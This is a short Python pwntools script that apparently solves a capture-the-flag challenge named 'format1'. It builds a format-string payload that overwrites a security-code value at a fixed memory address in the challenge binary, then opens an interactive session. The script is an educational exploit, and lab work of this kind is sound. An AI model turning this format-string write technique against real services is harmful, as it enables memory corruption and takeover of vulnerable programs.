#!/usr/bin/env python3

from pwn import *

# Running checksec to examine/confirm defense systems
e = ELF('./format1')

# Sets the reference to the format1 program to consider architecture, endianness, etc.
# This is required to process the length of the payload.
context.binary = './format1'

# Setting the HOST and PORT as provided by the challenge
HOST = 'localhost'
PORT = 12000  # This value would change after every new launch of instance

# Setting an 'if' condition to easily switch between local and remote
DEBUG = False

if DEBUG == False:
    s = remote(HOST, PORT)
else:
    s = process('./format1')

# Response after connection is made
res = s.recvuntil(b'transmission: ').decode()
print(res)

# Setting necessary variables
security_code_addr = int('404050', 16)
new_val = int('64657461', 16)
offset = 14

addresses = {security_code_addr: new_val}

# Setting the payload
# Options for write_size are 'byte' (default), 'short', and 'int', which are %hhn (1-byte), %hn (2-byte), and %n (4-byte), respectively
payload = fmtstr_payload(offset, addresses, write_size='byte')

# Printing payload value for further analysis
print(payload)

# Sending payload as input to the format1 program
s.sendline(payload)

s.interactive()
